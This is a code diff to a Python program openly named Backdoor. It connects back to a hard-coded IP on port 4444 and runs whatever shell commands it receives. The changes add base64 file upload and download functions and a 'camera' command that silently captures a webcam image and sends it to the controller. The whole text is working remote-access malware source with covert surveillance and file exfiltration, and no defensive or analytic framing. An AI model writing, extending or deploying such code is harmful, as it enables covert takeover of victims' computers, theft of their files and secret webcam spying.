@@ -1,5 +1,6 @@
-import socket, json, subprocess, os
+import socket, json, subprocess, os, cv2
 import base64, threading, time, webbrowser
+
 
 
 def UkDecode(text):
@@ -18,7 +19,6 @@ class Backdoor:
 
 		self.connected = False
 		self.connection = None
-
 
 	def connect(self):
 		while True:
@@ -45,6 +45,19 @@ class Backdoor:
 				json_data += self.connection.recv(1024).decode()
 				return json.loads(json_data)
 			except: continue
+
+
+	def write_file(self, path, content):
+		content = base64.b64decode(content)
+		with open(path, "wb") as file:
+			file.write(content)
+			print(f"[+] You can see your file as {path}")
+
+
+	def read_file(self, path):
+		file = open(path, "rb").read()
+		file = base64.encodebytes(file).decode()
+		return file
 
 
 	def execute_system_command(self, command):
@@ -76,6 +89,13 @@ class Backdoor:
 					res = self.change_working_directory_to(path)
 					self.reliable_send(res)
 
+				elif command == "camera":
+					cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+					result, image = cam.read()
+					cv2.imwrite("camera.jpg", image)
+					self.reliable_send(self.read_file("camera.jpg") )           
+					cam.release()
+
 				else:
 					res = self.execute_system_command(command)
 					self.reliable_send(res)
@@ -83,7 +103,7 @@ class Backdoor:
 
 
 if __name__ == "__main__":
-	backdoor = Backdoor("192.168.0.199", 4444)
+	backdoor = Backdoor("192.168.0.108", 4444)
 
 	backdoor_thread = threading.Thread(target=backdoor.connect)
 	backdoor_thread.start()
